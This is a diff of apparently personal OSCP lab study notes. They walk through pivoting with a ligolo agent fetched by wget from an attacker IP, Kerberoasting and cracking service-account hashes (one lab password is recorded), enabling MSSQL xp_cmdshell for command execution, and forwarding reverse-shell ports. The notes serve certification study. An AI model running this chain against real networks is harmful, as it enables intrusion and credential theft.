@@ -1,22 +1,53 @@
-<pivotting technique>
+## pivotting technique<br>
 
-1. Transfer the agent file to the machine hovering over both Network segments
-wget http://192.168.45.173/agent.exe -outfile agent.exe
+1. Transfer the agent file to the machine hovering over both Network segments<br>
+wget http://192.168.45.173/agent.exe -outfile agent.exe<br>
 
-2. Start the ligolo server 
-./proxy -selfcert -laddr 0.0.0.0:443
+2. Start the ligolo server<br>
+./proxy -selfcert -laddr 0.0.0.0:443<br>
 
-3. Start the ligolo agent to connect to the server 
+3. Start the ligolo agent to connect to the server<br>
 ./agent.exe -connect 192.168.45.173:443 -ignore-cert
 
-![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/image.png?raw=true)
+![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/1.png?raw=true)
 
-ここで、internal machine である、DCにもアクセス出来る様になる。
+4. By this time, you should be able to access the internal machine by pivotting through the macine.
+
+![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/2.png?raw=true)
+
+5. nmap
+
+![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/3.png?raw=true)
+
+7. You can try Kerberoasting since you have access to the DC.
+`impacket-GetUserSPNs -request -dc-ip 10.10.138.146 oscp.exam/Eric.Wallows`
+
+![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/4.png?raw=true)
 
 
-impacket-GetUserSPNs -request -dc-ip 10.10.138.146 oscp.exam/Eric.Wallows
+8. Password crack the above hashes
+`hashcat -m 13100 kerberoas_hash /usr/share/wordlists/rockyou.txt`
+> sql_svc password  → Dolphin1
 
 
+9. Access the MSSQL server
+`EXEC sp_configure 'show advanced options', 1;`<br>
+`RECONFIGURE;`<br>
+`EXEC sp_configure 'xp_cmdshell', 1;`<br>
+`RECONFIGURE;`<br>
+`EXEC xp_cmdshell ' whoami '`<br>
+
+![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/5.png?raw=true)
+
+
+10. Set the Port forwardinf IP so that the internal machines can access Kali
+
+`listener_add --addr 0.0.0.0:888 --to 0.0.0.0:888`<br>
+`listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4444`<br>
+`listener_add --addr 0.0.0.0:80 --to 0.0.0.0:80`<br>
+`listener_add --addr 0.0.0.0:8000 --to 0.0.0.0:8000`<br>
+
+![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/6.png?raw=true)
 
 
 
